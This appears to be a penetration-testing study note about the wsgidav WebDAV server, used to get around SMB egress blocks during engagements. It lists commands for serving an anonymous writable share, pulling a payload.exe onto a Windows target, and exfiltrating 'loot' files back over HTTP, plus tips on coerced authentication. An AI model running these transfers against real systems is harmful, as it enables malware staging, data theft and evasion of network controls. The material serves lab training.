# wsgidav

**Tags:** #wsgidav #WebDAV #FileTransfer #PostExploitation #Evasion #HTTP #Windows

`wsgidav` is a Python WebDAV server. Its value on an engagement is that Windows mounts WebDAV shares with the same UNC syntax as SMB (`\\host\DavWWWRoot`) but the traffic is **HTTP on port 80** — so it survives the very common egress rule that blocks outbound 445 while leaving 80/443 open. That makes it the fallback when `impacket-smbserver` can't be reached from the target.

**Source:** https://github.com/mar10/wsgidav
**Install:** `pip3 install wsgidav cheroot`

```bash
# Anonymous, writable share on port 80
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Non-privileged port
wsgidav --host=0.0.0.0 --port=8080 --root=/tmp/share --auth=anonymous
```

```powershell
# From the Windows target — UNC access, no drive mapping needed
copy \\10.10.14.5\DavWWWRoot\payload.exe C:\Windows\Temp\
dir \\10.10.14.5\DavWWWRoot\

# Map it as a drive
net use Z: http://10.10.14.5/
copy Z:\payload.exe C:\Windows\Temp\
net use Z: /delete

# Exfil the other direction
copy C:\loot\file.txt \\10.10.14.5\DavWWWRoot\
```

> [!note] The `WebClient` service must be running on the target for UNC-over-WebDAV to work. It's present on workstations and starts on demand; on Server SKUs the "WebDAV Redirector" feature is often absent entirely. If `net use` to an HTTP URL errors immediately, that's why — fall back to `curl.exe`/`certutil`.

> [!tip] Because the share is reachable by UNC path, it also works as the target for coerced-authentication and DLL-sideloading paths where a UNC is accepted but SMB is filtered.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] — SMB-style transfers over HTTP when 445 is blocked; SMB counterpart is [[Tools/File Transfer/SMBserver|impacket-smbserver]].

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
